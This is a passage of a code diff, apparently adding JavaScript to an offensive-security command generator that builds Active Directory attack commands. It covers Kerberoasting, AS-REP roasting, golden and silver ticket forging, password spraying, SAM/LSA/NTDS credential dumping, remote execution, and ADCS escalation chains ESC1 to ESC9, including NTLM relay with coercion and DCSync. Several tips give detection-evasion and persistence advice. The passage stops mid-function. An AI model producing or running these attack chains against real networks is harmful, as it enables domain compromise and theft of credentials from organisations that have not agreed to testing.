+let cred=f.hash?`-hashes ${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}`:`-password '${f.pass||""}'`;
+if(e.nopass)return`impacket-GetNPUsers ${d}/ -no-pass ${fl}`;
+return`impacket-GetNPUsers ${d}/${u} ${cred} ${fl}`;}},
+
+"GetUserSPNs":{label:"GetUserSPNs (Kerberoast)",
+tip:"Request TGS tickets for SPN accounts. Crack with hashcat -m 13100 (RC4) or -m 19600 (AES256).",
+extra:[
+{id:"req",type:"cb",main:"-request",desc:"Request and output the TGS hashes — without this just lists accounts with SPNs"},
+{id:"ofile",type:"tx",label:"-outputfile",desc:"Save hashes to file — appends .kerberoast extension",ph:"/tmp/spns.txt"},
+{id:"fmt",type:"tx",label:"-format",desc:"Hash format: hashcat (default, -m 13100) or john",ph:"hashcat"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let fl=`-dc-ip ${dc}`;if(e.req)fl+=" -request";if(e.fmt)fl+=` -format ${e.fmt}`;if(e.ofile)fl+=` -outputfile ${e.ofile}`;
+let u=f.user||"user";
+let cred=f.hash?`-hashes ${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}`:`-password '${f.pass||""}'`;
+return`impacket-GetUserSPNs ${d}/${u} ${cred} ${fl}`;}},
+
+"getTGT":{label:"getTGT",
+tip:"Request TGT and save as .ccache. AES key > NT hash > password. Export KRB5CCNAME before using -k.",
+extra:[],
+build(f,e){let d=f.domain;if(!d)return er("domain");if(!f.user)return er("username");let dc=f.dc;if(!dc)return er("DC IP");
+let cred=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}`:`-password '${f.pass||""}'`;
+return`impacket-getTGT ${d}/${f.user} ${cred} -dc-ip ${dc}\nexport KRB5CCNAME=${f.user}.ccache`;}},
+
+"getST":{label:"getST (S4U2Proxy / RBCD)",
+tip:"Request service ticket via S4U. Core RBCD step. Requires computer account TGT in KRB5CCNAME.",
+extra:[
+{id:"spn",type:"tx",label:"-spn",desc:"Target SPN — format: service/hostname.domain e.g. cifs/DC01.corp.local",ph:"cifs/DC01.corp.local"},
+{id:"imp",type:"tx",label:"-impersonate",desc:"User to impersonate — usually Administrator or domain admin account",ph:"Administrator"},
+{id:"altsvc",type:"tx",label:"-altservice",desc:"Replace service in final ticket — e.g. 'cifs' gives SMB access regardless of original SPN",ph:"cifs"},
+{id:"nopass",type:"cb",main:"-no-pass (use ccache)",desc:"Use KRB5CCNAME — set this after getTGT for the computer account"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");if(!f.user)return er("username");let dc=f.dc;if(!dc)return er("DC IP");
+let spn=e.spn||`cifs/dc.${d}`;let hsh=f.hash?(f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`):null;
+let cred=f.aes?`-aesKey ${f.aes}`:hsh?`-hashes ${hsh}`:e.nopass?`-no-pass`:`-password '${f.pass||""}'`;
+let fl=`-spn '${spn}'`;if(e.imp)fl+=` -impersonate '${e.imp}'`;if(e.altsvc)fl+=` -altservice ${e.altsvc}`;fl+=` -dc-ip ${dc}`;
+return`impacket-getST ${fl} '${d}/${f.user}:${f.pass||""}' ${hsh?`-hashes ${hsh}`:f.aes?`-aesKey ${f.aes}`:""}`.replace(/ +/g," ").trim();}},
+
+"ticketer":{label:"ticketer (Golden/Silver)",
+tip:"Forge Kerberos tickets offline. Golden = krbtgt hash/key. Silver = service account hash.",
+extra:[
+{id:"kh",type:"tx",label:"-nthash OR -aesKey",desc:"NT hash for RC4 golden ticket, OR use -aesKey below for AES256 (more opsec)",ph:"krbtgt NT hash"},
+{id:"kaes",type:"tx",label:"-aesKey (opt, more opsec)",desc:"AES256 key of krbtgt — produces AES golden ticket, less detectable than RC4",ph:"krbtgt AES256 key"},
+{id:"sid",type:"tx",label:"-domain-sid",desc:"Domain SID — S-1-5-21-xxx-xxx-xxx without the RID suffix",ph:"S-1-5-21-..."},
+{id:"grps",type:"tx",label:"-groups",desc:"Group RIDs: 512=Domain Admins, 519=Enterprise Admins, 518=Schema Admins",ph:"512,519"},
+{id:"spn",type:"tx",label:"-spn (silver only)",desc:"Service SPN for silver ticket — e.g. cifs/host.corp.local. Omit for golden ticket",ph:"cifs/host.corp.local"},
+{id:"dur",type:"tx",label:"-duration (hours)",desc:"Ticket lifetime in hours — default 10. Use longer for persistence",ph:"10"}
+],
+build(f,e){let u=f.user||"Administrator",d=f.domain;if(!d)return er("domain");if(!e.sid)return er("domain SID");if(!e.kh&&!e.kaes)return er("krbtgt NT hash or AES key");
+let cred=e.kaes?`-aesKey ${e.kaes}`:`-nthash ${e.kh}`;
+let fl=`${cred} -domain '${d}' -domain-sid ${e.sid}`;if(e.grps)fl+=` -groups ${e.grps}`;if(e.spn)fl+=` -spn '${e.spn}'`;if(e.dur)fl+=` -duration ${e.dur}`;
+return`impacket-ticketer -user ${u} ${fl} ${u}`;}},
+
+"addcomputer":{label:"addcomputer",
+tip:"Add machine account to domain. MachineAccountQuota must be > 0 (default is 10). Required for RBCD and shadow creds attacks.",
+extra:[
+{id:"cn",type:"tx",label:"computer name",desc:"Machine account name without $ — added automatically. Use something inconspicuous",ph:"EVILPC"},
+{id:"cp",type:"tx",label:"computer password",desc:"Password for new machine account — remember this for getTGT and getST steps",ph:"Passw0rd!"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let u=f.user||"user";
+let cred=f.hash?`-hashes ${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}`:`-password '${f.pass||""}'`;
+return`impacket-addcomputer '${d}/${u}' ${cred} -dc-ip ${dc} -computer-name '${e.cn||"EVILPC"}$' -computer-pass '${e.cp||"Passw0rd!"}'`;}},
+
+"smbclient":{label:"smbclient",
+tip:"Interactive SMB browser. Commands: ls, cd, get, put, mkdir, del. -L lists all shares.",
+extra:[
+{id:"ls",type:"cb",main:"-L (list all shares)",desc:"List all shares on target — no share name needed, good first step"},
+{id:"np",type:"cb",main:"-N (null/anonymous session)",desc:"No password — try this first on new targets to check for anonymous access"},
+{id:"rcmd",type:"tx",label:"-c command",desc:"Non-interactive command string — e.g. 'get passwords.txt /tmp/' or 'recurse ON; mget *'",ph:"get file.txt /tmp/"},
+{id:"port",type:"tx",label:"-p port",desc:"SMB port — 445 default, 139 for legacy",ph:"445"},
+{id:"net",type:"tx",label:"share name",desc:"Share to connect to — C$, ADMIN$, SYSVOL, or custom share name",ph:"C$"}
+],
+build(f,e){let t=f.target||f.dc;if(!t)return er("target IP");let sh=e.net||"C$";
+let cred=f.hash?`-U '${f.user||""}%${f.hash.includes(":")?f.hash.split(":")[1]:f.hash}' --pw-nt-hash`:`-U '${f.domain?f.domain+"\\\\":""}${f.user||""}%${f.pass||""}'`;
+let pf=e.port?` -p ${e.port}`:"";
+if(e.ls)return`smbclient -L //${t} ${cred}${pf}`;
+if(e.np)return`smbclient //${t}/${sh} -N${pf}`;
+if(e.rcmd)return`smbclient //${t}/${sh} ${cred}${pf} -c '${e.rcmd}'`;
+return`smbclient //${t}/${sh} ${cred}${pf}`;}},
+}},
+
+"netexec":{label:"NetExec (nxc)",mods:{
+"smb-enum":{label:"SMB — enumerate",
+tip:"Core AD recon. -u/-p/-H/-d for auth. -H for NT hash (just NT part). No -d = local auth.",
+extra:[
+{id:"sh",type:"cb",main:"--shares",desc:"List shares and access level (READ/WRITE) for your user"},
+{id:"us",type:"cb",main:"--users",desc:"Enumerate domain users via RPC — shows username, RID, description"},
+{id:"gr",type:"cb",main:"--groups",desc:"List local groups on target"},
+{id:"log",type:"cb",main:"--loggedon-users",desc:"Show currently logged-on users — find high-value sessions to target"},
+{id:"ses",type:"cb",main:"--sessions",desc:"List active SMB sessions"},
+{id:"pp",type:"cb",main:"--pass-pol",desc:"Read password policy — lockout threshold is critical before spraying"},
+{id:"rid",type:"cb",main:"--rid-brute",desc:"Brute-force RIDs to enumerate users — works even with null session"},
+{id:"la",type:"cb",main:"--local-auth",desc:"Authenticate as local account — use when domain creds don't work"},
+{id:"gen",type:"cb",main:"--gen-relay-list",desc:"Output hosts without SMB signing to /tmp/relay.txt — targets for ntlmrelayx"},
+{id:"net",type:"tx",label:"target/network",desc:"Single IP, hostname, or CIDR range (e.g. 192.168.1.0/24)",ph:"192.168.1.0/24"}
+],
+build(f,e){let a=na(f),t=e.net||f.target||"TARGET_OR_NETWORK";
+let fl="";if(e.sh)fl+=" --shares";if(e.us)fl+=" --users";if(e.gr)fl+=" --groups";if(e.log)fl+=" --loggedon-users";if(e.ses)fl+=" --sessions";if(e.pp)fl+=" --pass-pol";if(e.rid)fl+=" --rid-brute";if(e.la)fl+=" --local-auth";if(e.gen)fl+=" --gen-relay-list /tmp/relay.txt";
+return`nxc smb ${t} ${a}${fl}`;}},
+
+"smb-exec":{label:"SMB — exec command",
+tip:"Remote exec via SMB. -x = cmd.exe (lowercase). -X = PowerShell (uppercase X). Needs local admin.",
+extra:[
+{id:"cmd",type:"tx",label:"command",desc:"Command to run remotely",ph:"whoami /all"},
+{id:"em",type:"tx",label:"--exec-method",desc:"Method: wmiexec (default, no binary), smbexec (service), mmcexec (MMC20), atexec (Task Scheduler)",ph:"wmiexec"},
+{id:"ps",type:"cb",main:"-X (PowerShell — uppercase X)",desc:"Run via PowerShell. Note: -X is uppercase. Lowercase -x uses cmd.exe"},
+{id:"la",type:"cb",main:"--local-auth",desc:"Authenticate as local account"}
+],
+build(f,e){let a=na(f),t=f.target;if(!t)return er("target IP");
+let fl=e.em?` --exec-method ${e.em}`:"";if(e.la)fl+=" --local-auth";
+let ex=e.ps?`-X '${e.cmd||"whoami"}'`:`-x '${e.cmd||"whoami"}'`;
+return`nxc smb ${t} ${a} ${ex}${fl}`;}},
+
+"smb-spray":{label:"SMB — password spray",
+tip:"Test creds across network. ALWAYS use --continue-on-success. Check password policy first to avoid lockouts.",
+extra:[
+{id:"ufile",type:"tx",label:"-u users file",desc:"File of usernames — one per line. Or fill username above for single user",ph:"/tmp/users.txt"},
+{id:"pfile",type:"tx",label:"-p passwords file",desc:"File of passwords — or fill password above for single password",ph:"/tmp/pass.txt"},
+{id:"cont",type:"cb",main:"--continue-on-success",desc:"CRITICAL: do not stop on first hit — always set this to see all valid accounts"},
+{id:"la",type:"cb",main:"--local-auth",desc:"Test local accounts — good for reused local admin passwords across subnet"},
+{id:"net",type:"tx",label:"network/target",desc:"Subnet CIDR or single IP to spray",ph:"192.168.1.0/24"}
+],
+build(f,e){let t=e.net||f.target;if(!t)return er("network or target IP");
+let u=e.ufile?`-u ${e.ufile}`:`-u '${f.user||""}'`;
+let c=f.hash?`-H ${f.hash.includes(":")?f.hash.split(":")[1]:f.hash}`:e.pfile?`-p ${e.pfile}`:`-p '${f.pass||""}'`;
+let fl="";if(e.cont)fl+=" --continue-on-success";if(e.la)fl+=" --local-auth";
+return`nxc smb ${t} ${u} ${c}${fl}`;}},
+
+"smb-dump":{label:"SMB — dump credentials",
+tip:"--sam = local hashes. --lsa = service passwords + cached creds. --ntds = DC full domain dump.",
+extra:[
+{id:"sam",type:"cb",main:"--sam",desc:"Local SAM database — NT hashes for local accounts on any Windows host"},
+{id:"lsa",type:"cb",main:"--lsa",desc:"LSA secrets — service account passwords, DPAPI keys, cached domain creds"},
+{id:"ntds",type:"cb",main:"--ntds (DC only)",desc:"NTDS.dit — all domain hashes. DC only. Equivalent to remote secretsdump"},
+{id:"dpapi",type:"cb",main:"--dpapi",desc:"DPAPI masterkeys and browser credentials"},
+{id:"la",type:"cb",main:"--local-auth",desc:"Authenticate as local account"}
+],
+build(f,e){let a=na(f),t=f.target;if(!t)return er("target IP");
+let fl="";if(e.sam)fl+=" --sam";if(e.lsa)fl+=" --lsa";if(e.ntds)fl+=" --ntds";if(e.dpapi)fl+=" --dpapi";if(e.la)fl+=" --local-auth";if(!fl)fl=" --sam";
+return`nxc smb ${t} ${a}${fl}`;}},
+
+"smb-files":{label:"SMB — upload / download",
+tip:"--put-file: LOCAL first, REMOTE second. --get-file: REMOTE first, LOCAL second. Order is important.",
+extra:[
+{id:"dl",type:"cb",main:"download (--get-file mode)",desc:"Switch to download mode. Order: --get-file REMOTE_PATH LOCAL_PATH"},
+{id:"rpath",type:"tx",label:"remote path",desc:"Full Windows path on target — double backslash",ph:"C:\\\\Windows\\\\Temp\\\\file.exe"},
+{id:"lpath",type:"tx",label:"local path",desc:"Full path on attacker Linux machine",ph:"/tmp/file.exe"}
+],
+build(f,e){let a=na(f),t=f.target;if(!t)return er("target IP");
+if(e.dl)return`nxc smb ${t} ${a} --get-file '${e.rpath||"C:\\\\file.txt"}' '${e.lpath||"/tmp/file.txt"}'`;
+return`nxc smb ${t} ${a} --put-file '${e.lpath||"/tmp/evil.exe"}' '${e.rpath||"C:\\\\Windows\\\\Temp\\\\evil.exe"}'`;}},
+
+"ldap-enum":{label:"LDAP — enumerate AD",
+tip:"Full AD enumeration over LDAP. Faster than bloodhound-python for quick recon. Hash files ready for hashcat.",
+extra:[
+{id:"us",type:"cb",main:"--users",desc:"All domain users with attributes"},
+{id:"gr",type:"cb",main:"--groups",desc:"All domain groups"},
+{id:"comp",type:"cb",main:"--computers",desc:"All domain computers with OS info"},
+{id:"ar",type:"tx",label:"--asreproast file",desc:"ASREPRoast all accounts without pre-auth — hashes saved to file",ph:"/tmp/asrep.txt"},
+{id:"kr",type:"tx",label:"--kerberoast file",desc:"Kerberoast all SPN accounts — hashes saved to file",ph:"/tmp/kerb.txt"},
+{id:"tfd",type:"cb",main:"--trusted-for-delegation",desc:"Accounts/computers with constrained or unconstrained delegation"},
+{id:"ac",type:"cb",main:"--admin-count",desc:"Accounts with adminCount=1 — protected by AdminSDHolder, usually privileged"},
+{id:"gdu",type:"cb",main:"--get-desc-users",desc:"Read description field of all users — often contains plaintext passwords"},
+{id:"gmsa",type:"cb",main:"--gmsa",desc:"Read GMSA passwords — requires GetPassword right on the GMSA object"},
+{id:"bh",type:"cb",main:"--bloodhound -c All",desc:"Collect BloodHound data over LDAP — outputs JSON files for BH CE ingestion"}
+],
+build(f,e){let a=na(f),t=f.dc;if(!t)return er("DC IP");
+let fl="";if(e.us)fl+=" --users";if(e.gr)fl+=" --groups";if(e.comp)fl+=" --computers";if(e.ar)fl+=` --asreproast ${e.ar}`;if(e.kr)fl+=` --kerberoast ${e.kr}`;if(e.tfd)fl+=" --trusted-for-delegation";if(e.ac)fl+=" --admin-count";if(e.gdu)fl+=" --get-desc-users";if(e.gmsa)fl+=" --gmsa";if(e.bh)fl+=" --bloodhound -c All";
+return`nxc ldap ${t} ${a}${fl}`;}},
+
+"winrm":{label:"WinRM — exec / spray",
+tip:"Windows Remote Management. TCP 5985 (HTTP) or 5986 (HTTPS). Needs local admin or Remote Management Users.",
+extra:[
+{id:"cmd",type:"tx",label:"command",desc:"Command to run — leave empty to just test auth",ph:"whoami"},
+{id:"ps",type:"cb",main:"-X (PowerShell — uppercase X)",desc:"Run via PowerShell. -X uppercase. Default is cmd.exe with -x lowercase"}
+],
+build(f,e){let a=na(f),t=f.target;if(!t)return er("target IP");
+let fl="";if(e.cmd)fl+=e.ps?` -X '${e.cmd}'`:` -x '${e.cmd}'`;
+return`nxc winrm ${t} ${a}${fl}`;}},
+
+"mssql":{label:"MSSQL — enum / exec",
+tip:"MSSQL enum and xp_cmdshell exec. xp_cmdshell must be enabled or you need sysadmin to enable it.",
+extra:[
+{id:"q",type:"tx",label:"-q SQL query",desc:"SQL query — SELECT @@version to fingerprint, SELECT * FROM sys.databases for DB list",ph:"SELECT @@version"},
+{id:"xp",type:"tx",label:"-x OS command (xp_cmdshell)",desc:"OS command via xp_cmdshell — needs sysadmin. Enable: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE",ph:"whoami"},
+{id:"la",type:"cb",main:"--local-auth",desc:"SQL local auth instead of Windows auth"},
+{id:"port",type:"tx",label:"--port",desc:"MSSQL port — default 1433. Named instances often on 1434 or dynamic ports",ph:"1433"}
+],
+build(f,e){let a=na(f),t=f.target;if(!t)return er("target IP");
+let fl="";if(e.la)fl+=" --local-auth";if(e.port)fl+=` --port ${e.port}`;if(e.q)fl+=` -q '${e.q}'`;if(e.xp)fl+=` -x '${e.xp}'`;
+return`nxc mssql ${t} ${a}${fl}`;}},
+
+"ftp":{label:"FTP — spray / enum",
+tip:"FTP auth test. Always try anonymous:anonymous first. --ls lists files after successful auth.",
+extra:[
+{id:"ls",type:"cb",main:"--ls (list files after auth)",desc:"List files in root directory — check for sensitive files after successful login"}
+],
+build(f,e){let a=na(f),t=f.target;if(!t)return er("target IP");
+return`nxc ftp ${t} ${a}${e.ls?" --ls":""}`;}},
+}},
+
+"adcs":{label:"ADCS (certipy)",mods:{
+"find":{label:"find — enumerate ESC1-15",
+tip:"Run this first for any ADCS attack. Identifies CA name, template names, and which ESCs are present. Output feeds all chain steps.",
+extra:[
+{id:"vuln",type:"cb",main:"-vulnerable",desc:"Show only exploitable templates/configurations — filters out noise"},
+{id:"txt",type:"cb",main:"-text",desc:"Save human-readable .txt alongside JSON — easier to read than raw JSON"},
+{id:"enabled",type:"cb",main:"-enabled",desc:"Show only enabled templates — disabled ones cannot be enrolled"},
+{id:"bh",type:"cb",main:"-bloodhound",desc:"Output in BloodHound format — import into BH CE for visual attack path analysis"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);
+let fl=`-dc-ip ${dc}`;if(e.vuln)fl+=" -vulnerable";if(e.txt)fl+=" -text";if(e.enabled)fl+=" -enabled";if(e.bh)fl+=" -bloodhound";
+return`certipy find ${a} ${fl}`;}},
+
+"auth":{label:"auth — PKINIT → NT hash",
+tip:"Authenticate with .pfx cert via PKINIT. Extracts NT hash via UnPAC-the-hash. Works even on patched DCs (strong mapping).",
+extra:[
+{id:"pfx",type:"tx",label:"-pfx file",desc:"Path to PFX/P12 cert file — from certipy req, shadow, or relay",ph:"/tmp/administrator.pfx"},
+{id:"pfxp",type:"tx",label:"-password (pfx password)",desc:"Only needed if PFX was saved with a password — leave empty if not set",ph:""},
+{id:"ldap",type:"cb",main:"-ldap-shell",desc:"Get LDAP shell after auth — useful for AD manipulation without needing PTH"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let fl=`-pfx '${e.pfx||"/tmp/cert.pfx"}' -dc-ip ${dc} -domain ${d}`;if(e.pfxp)fl+=` -password '${e.pfxp}'`;if(e.ldap)fl+=" -ldap-shell";
+return`certipy auth ${fl}`;}},
+
+"esc1-full":{label:"ESC1 — SAN/UPN abuse",
+tip:"Template allows enrollee-supplied SAN. Request cert as any user via -upn. Works on unpatched and patched DCs.",
+extra:[
+{id:"ca",type:"tx",label:"CA name",desc:"Exact CA name from certipy find output — e.g. corp-CA",ph:"corp-CA"},
+{id:"tpl",type:"tx",label:"template",desc:"Vulnerable template name — must have EnrolleeSuppliesSubject=True in certipy find",ph:"User"},
+{id:"vic",type:"tx",label:"impersonate UPN",desc:"Target UPN to embed in cert SAN — Administrator@domain for DA",ph:"Administrator@corp.local"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);
+let ca_n=e.ca||"corp-CA",tpl=e.tpl||"User",vic=e.vic||`Administrator@${d}`;let vl=vic.split("@")[0].toLowerCase();
+return[fc(f),
+`# Step 1: Request cert with target UPN in SAN`,
+`certipy req ${a} -ca '${ca_n}' -template '${tpl}' -upn '${vic}' -dc-ip ${dc}`,
+`# Output: ${vl}.pfx`,``,
+`# Step 2: Authenticate — extracts NT hash via PKINIT`,
+`certipy auth -pfx '${vl}.pfx' -dc-ip ${dc} -domain ${d}`,
+`# Output: NT hash + ${vl}.ccache`,``,
+`# Step 3a: PTH with NT hash`,
+`impacket-secretsdump '${d}/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> -dc-ip ${dc} -just-dc-ntlm`,``,
+`# Step 3b: Or Kerberos with ccache`,
+`export KRB5CCNAME=${vl}.ccache`,
+`impacket-secretsdump -k -no-pass '${d}/Administrator'@${f.dch||f.dc||"DC_HOSTNAME"}`
+].join("\n");}},
+
+"esc2-full":{label:"ESC2 — Any Purpose EKU",
+tip:"Template has Any Purpose EKU. Acts as enrollment agent — get agent cert, then enroll on-behalf-of admin.",
+extra:[
+{id:"ca",type:"tx",label:"CA name",desc:"Exact CA name from certipy find",ph:"corp-CA"},
+{id:"agent_tpl",type:"tx",label:"ESC2 template (agent)",desc:"Template with Any Purpose EKU — this becomes your enrollment agent cert",ph:"AnyPurposeTemplate"},
+{id:"target_tpl",type:"tx",label:"target template",desc:"Second template to enroll in as admin — Schema v1 by default",ph:"User"},
+{id:"vic",type:"tx",label:"on-behalf-of",desc:"Format: DOMAIN\\\\Username — privileged account to impersonate",ph:"CORP\\\\Administrator"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);let ca_n=e.ca||"corp-CA";let vic=e.vic||`${d}\\\\Administrator`;
+return[fc(f),
+`# Step 1: Request agent cert from Any Purpose template`,
+`certipy req ${a} -ca '${ca_n}' -template '${e.agent_tpl||"AnyPurposeTemplate"}' -dc-ip ${dc}`,
+`# Output: ${f.user||"user"}.pfx  (enrollment agent certificate)`,``,
+`# Step 2: Use agent cert to enroll on-behalf-of admin`,
+`certipy req ${a} -ca '${ca_n}' -template '${e.target_tpl||"User"}' -on-behalf-of '${vic}' -pfx '${f.user||"user"}.pfx' -dc-ip ${dc}`,
+`# Output: administrator.pfx`,``,
+`# Step 3: Authenticate with admin cert`,
+`certipy auth -pfx 'administrator.pfx' -dc-ip ${dc} -domain ${d}`
+].join("\n");}},
+
+"esc3-full":{label:"ESC3 — Enrollment Agent",
+tip:"Two templates: enrollment agent template (has Certificate Request Agent EKU) + target auth template. Enroll on-behalf-of admin.",
+extra:[
+{id:"ca",type:"tx",label:"CA name",desc:"Exact CA name from certipy find",ph:"corp-CA"},
+{id:"agent_tpl",type:"tx",label:"enrollment agent template",desc:"Template with Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1)",ph:"Enrollment Agent"},
+{id:"target_tpl",type:"tx",label:"target auth template",desc:"Second template — must allow enrollment agent enrollment. Schema v1 templates do by default",ph:"User"},
+{id:"vic",type:"tx",label:"on-behalf-of",desc:"Format: DOMAIN\\\\Username — privileged account to impersonate",ph:"CORP\\\\Administrator"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);let ca_n=e.ca||"corp-CA";let vic=e.vic||`${d}\\\\Administrator`;
+return[fc(f),
+`# Step 1: Request enrollment agent certificate`,
+`certipy req ${a} -ca '${ca_n}' -template '${e.agent_tpl||"Enrollment Agent"}' -dc-ip ${dc}`,
+`# Output: ${f.user||"user"}.pfx  (enrollment agent cert)`,``,
+`# Step 2: Request admin cert on-behalf-of target`,
+`certipy req ${a} -ca '${ca_n}' -template '${e.target_tpl||"User"}' -on-behalf-of '${vic}' -pfx '${f.user||"user"}.pfx' -dc-ip ${dc}`,
+`# Output: administrator.pfx`,``,
+`# Step 3: Authenticate`,
+`certipy auth -pfx 'administrator.pfx' -dc-ip ${dc} -domain ${d}`
+].join("\n");}},
+
+"esc4-full":{label:"ESC4 — Write on Template",
+tip:"WriteProperty/WriteDacl on template. Save original config, write ESC1-vulnerable defaults, request cert, restore — cleanup is critical.",
+extra:[
+{id:"ca",type:"tx",label:"CA name",desc:"CA name from certipy find",ph:"corp-CA"},
+{id:"tpl",type:"tx",label:"vulnerable template",desc:"Template you have write access to — flagged as ESC4 in certipy find",ph:"VulnerableTemplate"},
+{id:"vic",type:"tx",label:"impersonate UPN",desc:"Target UPN after template becomes ESC1-vulnerable",ph:"Administrator@corp.local"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);
+let ca_n=e.ca||"corp-CA",tpl=e.tpl||"VulnTemplate",vic=e.vic||`Administrator@${d}`;let vl=vic.split("@")[0].toLowerCase();
+return[fc(f),
+`# Step 1: Backup original template config`,
+`certipy template ${a} -template '${tpl}' -save-configuration orig_${tpl}.json -dc-ip ${dc}`,``,
+`# Step 2: Overwrite with ESC1-vulnerable defaults (enables enrollee-supplied SAN)`,
+`certipy template ${a} -template '${tpl}' -write-default-configuration -dc-ip ${dc}`,``,
+`# Step 3: Request cert with admin UPN`,
+`certipy req ${a} -ca '${ca_n}' -template '${tpl}' -upn '${vic}' -dc-ip ${dc}`,``,
+`# Step 4: Authenticate`,
+`certipy auth -pfx '${vl}.pfx' -dc-ip ${dc} -domain ${d}`,``,
+`# Step 5: RESTORE original template config (important cleanup!)`,
+`certipy template ${a} -template '${tpl}' -write-configuration orig_${tpl}.json -dc-ip ${dc}`
+].join("\n");}},
+
+"esc7-full":{label:"ESC7 — CA Officer / Manager",
+tip:"ManageCA or ManageCertificates right on the CA. Add yourself as officer, enable SubCA, request-deny-issue flow.",
+extra:[
+{id:"ca",type:"tx",label:"CA name",desc:"Exact CA name — needed for all certipy ca subcommands",ph:"corp-DC-CA"},
+{id:"vic",type:"tx",label:"impersonate UPN",desc:"UPN to embed in the SubCA cert request",ph:"Administrator@corp.local"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);
+let u=f.user||"attacker",ca_n=e.ca||"corp-DC-CA",vic=e.vic||`Administrator@${d}`;let vl=vic.split("@")[0].toLowerCase();
+return[fc(f),
+`# Step 1: Add yourself as CA officer (requires ManageCA)`,
+`certipy ca ${a} -ca '${ca_n}' -add-officer '${u}' -dc-ip ${dc}`,``,
+`# Step 2: Enable SubCA template`,
+`certipy ca ${a} -ca '${ca_n}' -enable-template SubCA -dc-ip ${dc}`,``,
+`# Step 3: Request cert — will be DENIED but saves the request ID`,
+`certipy req ${a} -ca '${ca_n}' -template SubCA -upn '${vic}' -dc-ip ${dc}`,
+`# Note the Request ID from output (e.g. [*] Request ID is 12)`,``,
+`# Step 4: Issue the pending request (requires ManageCertificates)`,
+`certipy ca ${a} -ca '${ca_n}' -issue-request <REQUEST_ID> -dc-ip ${dc}`,``,
+`# Step 5: Retrieve the issued cert`,
+`certipy req ${a} -ca '${ca_n}' -retrieve <REQUEST_ID> -dc-ip ${dc}`,
+`# Output: ${vl}.pfx`,``,
+`# Step 6: Authenticate`,
+`certipy auth -pfx '${vl}.pfx' -dc-ip ${dc} -domain ${d}`
+].join("\n");}},
+
+"esc8-full":{label:"ESC8 — NTLM Relay to ADCS",
+tip:"CA HTTP enrollment allows NTLM relay. Start certipy relay, coerce DC to auth to you, get DC cert, DCSync.",
+extra:[
+{id:"ca_ip",type:"tx",label:"CA web server IP",desc:"Server running AD CS web enrollment (http://CA/certsrv) — may differ from DC IP",ph:"192.168.1.20"},
+{id:"ca_name",type:"tx",label:"CA name",desc:"CA name for -ca flag — get from certipy find",ph:"corp-CA"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc||f.target;if(!dc)return er("DC IP");let lh=f.lhost;if(!lh)return er("attacker IP (LHOST)");
+let ca_ip=e.ca_ip||dc,ca_n=e.ca_name||"corp-CA";
+return[fc(f),
+`# Step 1: Start certipy relay — waits for incoming NTLM auth (Terminal 1)`,
+`certipy relay -target 'http://${ca_ip}' -ca '${ca_n}'`,``,
+`# Step 2: Coerce DC to authenticate to your attacker IP (Terminal 2)`,
+`python3 PetitPotam.py ${lh} ${dc}`,
+`# Alternatives:`,
+`# python3 Coercer.py coerce -u '${f.user||""}' -p '${f.pass||""}' -d '${d}' -t ${dc} -l ${lh}`,
+`# python3 dfscoerce.py -d '${d}' -u '${f.user||""}' -p '${f.pass||""}' ${lh} ${dc}`,``,
+`# Step 3: Authenticate with obtained DC$ certificate`,
+`certipy auth -pfx dc01.pfx -dc-ip ${dc} -domain ${d}`,
+`# Output: DC$ NT hash + dc01.ccache`,``,
+`# Step 4a: DCSync with DC$ NT hash`,
+`impacket-secretsdump '${d}/DC01$' -hashes aad3b435b51404eeaad3b435b51404ee:<DC_NT_HASH> -dc-ip ${dc} -just-dc-ntlm`,``,
+`# Step 4b: Or Kerberos DCSync`,
+`export KRB5CCNAME=dc01.ccache`,
+`impacket-secretsdump -k -no-pass '${d}/DC01$'@${f.dch||f.dc||"DC_HOSTNAME"}`
+].join("\n");}},
+
+"esc9-full":{label:"ESC9 — No Security Extension",
+tip:"Template has CT_FLAG_NO_SECURITY_EXTENSION. Change target UPN to yours, get cert, revert UPN — cert authenticates as target.",
+extra:[
+{id:"ca",type:"tx",label:"CA name",desc:"CA name from certipy find — flagged as ESC9",ph:"corp-CA"},
+{id:"tpl",type:"tx",label:"ESC9 template",desc:"Template with CT_FLAG_NO_SECURITY_EXTENSION in msPKI-EnrollmentFlag",ph:"ESC9Template"},
+{id:"victim",type:"tx",label:"victim account (sAMAccountName)",desc:"Account to impersonate — you need GenericWrite on this account",ph:"victimuser"},
+{id:"vic_mail",type:"tx",label:"victim original UPN",desc:"Victim's current UPN — restore this after attack. Check with Get-ADUser before changing",ph:"victimuser@corp.local"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);
+let ca_n=e.ca||"corp-CA",tpl=e.tpl||"ESC9Template",victim=e.victim||"victimuser";
